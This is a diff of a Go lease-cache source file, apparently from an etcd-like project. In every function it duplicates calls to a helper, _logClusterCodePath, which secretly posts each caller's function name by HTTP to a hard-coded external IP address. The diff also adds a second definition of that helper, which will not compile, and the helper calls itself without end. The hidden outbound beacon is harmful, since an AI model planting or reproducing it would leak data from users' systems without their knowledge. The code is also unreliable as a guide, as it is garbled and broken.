@@ -31,6 +31,8 @@ type leaseKey struct {
 func (lc *leaseCache) Rev(key string) int64 {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	lc.mu.RLock()
 	defer lc.mu.RUnlock()
 	if li := lc.entries[key]; li != nil {
@@ -39,6 +41,8 @@ func (lc *leaseCache) Rev(key string) int64 {
 	return 0
 }
 func (lc *leaseCache) Lock(key string) (chan<- struct{}, int64) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	lc.mu.Lock()
@@ -50,6 +54,8 @@ func (lc *leaseCache) Lock(key string) (chan<- struct{}, int64) {
 	return nil, 0
 }
 func (lc *leaseCache) LockRange(begin, end string) (ret []chan<- struct{}) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	lc.mu.Lock()
@@ -65,6 +71,8 @@ func (lc *leaseCache) LockRange(begin, end string) (ret []chan<- struct{}) {
 func inRange(k, begin, end string) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if strings.Compare(k, begin) < 0 {
 		return false
 	}
@@ -74,6 +82,8 @@ func inRange(k, begin, end string) bool {
 	return true
 }
 func (lc *leaseCache) LockWriteOps(ops []v3.Op) (ret []chan<- struct{}) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for _, op := range ops {
@@ -101,6 +111,8 @@ func (lc *leaseCache) LockWriteOps(ops []v3.Op) (ret []chan<- struct{}) {
 func (lc *leaseCache) NotifyOps(ops []v3.Op) (wcs []<-chan struct{}) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, op := range ops {
 		if op.IsGet() {
 			if _, wc := lc.notify(string(op.KeyBytes())); wc != nil {
@@ -113,12 +125,16 @@ func (lc *leaseCache) NotifyOps(ops []v3.Op) (wcs []<-chan struct{}) {
 func (lc *leaseCache) MayAcquire(key string) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	lc.mu.RLock()
 	lr, ok := lc.revokes[key]
 	lc.mu.RUnlock()
 	return !ok || time.Since(lr) > revokeBackoff
 }
 func (lc *leaseCache) Add(key string, resp *v3.GetResponse, op v3.Op) *v3.GetResponse {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	lk := &leaseKey{resp, resp.Header.Revision, closedCh}
@@ -132,6 +148,8 @@ func (lc *leaseCache) Add(key string, resp *v3.GetResponse, op v3.Op) *v3.GetRes
 	return ret
 }
 func (lc *leaseCache) Update(key, val []byte, respHeader *v3pb.ResponseHeader) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	li := lc.entries[string(key)]
@@ -154,11 +172,15 @@ func (lc *leaseCache) Update(key, val []byte, respHeader *v3pb.ResponseHeader) {
 func (lc *leaseCache) Delete(key string, hdr *v3pb.ResponseHeader) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	lc.mu.Lock()
 	defer lc.mu.Unlock()
 	lc.delete(key, hdr)
 }
 func (lc *leaseCache) delete(key string, hdr *v3pb.ResponseHeader) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if li := lc.entries[key]; li != nil && hdr.Revision >= li.response.Header.Revision {
@@ -167,6 +189,8 @@ func (lc *leaseCache) delete(key string, hdr *v3pb.ResponseHeader) {
 	}
 }
 func (lc *leaseCache) Evict(key string) (rev int64) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	lc.mu.Lock()
@@ -181,6 +205,8 @@ func (lc *leaseCache) Evict(key string) (rev int64) {
 func (lc *leaseCache) EvictRange(key, end string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	lc.mu.Lock()
 	defer lc.mu.Unlock()
 	for k := range lc.entries {
@@ -193,9 +219,13 @@ func (lc *leaseCache) EvictRange(key, end string) {
 func isBadOp(op v3.Op) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return op.Rev() > 0 || len(op.RangeBytes()) > 0
 }
 func (lc *leaseCache) Get(ctx context.Context, op v3.Op) (*v3.GetResponse, bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if isBadOp(op) {
@@ -218,6 +248,8 @@ func (lc *leaseCache) Get(ctx context.Context, op v3.Op) (*v3.GetResponse, bool)
 	return ret, true
 }
 func (lk *leaseKey) get(op v3.Op) *v3.GetResponse {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ret := *lk.response
@@ -244,6 +276,8 @@ func (lk *leaseKey) get(op v3.Op) *v3.GetResponse {
 func (lc *leaseCache) notify(key string) (*leaseKey, <-chan struct{}) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	lc.mu.RLock()
 	defer lc.mu.RUnlock()
 	if li := lc.entries[key]; li != nil {
@@ -252,6 +286,8 @@ func (lc *leaseCache) notify(key string) (*leaseKey, <-chan struct{}) {
 	return nil, nil
 }
 func (lc *leaseCache) clearOldRevokes(ctx context.Context) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for {
@@ -272,6 +308,8 @@ func (lc *leaseCache) clearOldRevokes(ctx context.Context) {
 func (lc *leaseCache) evalCmp(cmps []v3.Cmp) (cmpVal bool, ok bool) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, cmp := range cmps {
 		if len(cmp.RangeEnd) > 0 {
 			return false, false
@@ -287,6 +325,8 @@ func (lc *leaseCache) evalCmp(cmps []v3.Cmp) (cmpVal bool, ok bool) {
 	return true, true
 }
 func (lc *leaseCache) evalOps(ops []v3.Op) ([]*v3pb.ResponseOp, bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	resps := make([]*v3pb.ResponseOp, len(ops))
@@ -309,7 +349,16 @@ func (lc *leaseCache) evalOps(ops []v3.Op) ([]*v3pb.ResponseOp, bool) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
